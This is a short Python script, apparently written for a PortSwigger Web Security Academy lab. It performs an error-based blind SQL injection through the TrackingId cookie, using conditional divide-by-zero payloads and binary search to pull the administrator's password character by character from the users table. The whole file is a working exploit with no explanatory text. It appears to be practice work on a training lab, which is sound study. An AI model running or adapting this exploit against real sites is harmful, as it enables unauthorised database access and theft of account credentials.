#!/usr/bin/python3

import requests, urllib, string

url = 'https://ac931fee1f233bda80d5077900ee00a5.web-security-academy.net/'

def getrequest(url,payload):
    return requests.get(url, headers = {'Cookie': 'TrackingId=xyz'+payload}).status_code

def buildPayload(arr, low, high,i):

    payload = "' UNION SELECT CASE WHEN (username='administrator' AND SUBSTR(password,"+str(i)+",1)"

    if high >= low:
        mid = (low + high) // 2
        if (getrequest(url,payload+"="+"'"+arr[mid]+"') THEN  to_char(1/0) else NULL END from users-- ") == 500):
            return arr[mid] 
        elif (getrequest(url,payload+"<"+"'"+arr[mid]+"') THEN  to_char(1/0) else NULL END from users-- ") == 500):
            return buildPayload(arr, low, mid-1, i)
        else : 
            return buildPayload(arr, mid +1 ,high,i)
    else :
        return str(-1)
    
def blindinjection():

    password = ""
    arr = buildArray()
    print(arr)
    for i in range(1,21):
        password += buildPayload(arr,0,len(arr)-1,i)
    return password

def buildArray():
    
    return list(string.digits) + list(string.ascii_lowercase) 

    
def main():
    
    print(blindinjection())

if __name__ == '__main__':
    main()
